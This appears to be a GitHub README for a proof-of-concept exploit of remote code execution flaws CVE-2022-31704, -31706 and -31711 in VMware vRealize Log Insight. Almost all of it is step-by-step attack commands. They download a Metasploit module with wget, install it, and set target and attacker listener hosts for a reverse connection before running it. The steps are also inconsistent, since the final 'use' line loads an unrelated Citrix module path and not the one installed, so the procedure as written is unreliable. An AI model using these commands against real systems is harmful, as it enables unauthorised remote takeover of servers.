# CVE-2022-31704
# CVE-2022-31706
# CVE-2022-31711


![](https://img.shields.io/static/v1?label=Product&message=VMWare%20vRealize%20Log%20Insight&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=%3C8.10.2&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Remote%20Code%20Execution&color=red)


### Metasploit Framework 
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2022/VMware_vRealize_Log_Insight/vmware_vrli_rce.rb
```

```
cp vmware_vrli_rce.rb /usr/share/metasploit-framework/modules/exploits/linux/http/vmware_vrli_rce.rb
```
```
msfdb reinit; msfconsole -q
```
```
use exploits/freebsd/http/citrix_formssso_target_rce
```
```
set rhosts target_IP
```
```
set lhost attacker_IP
```
```
run
```
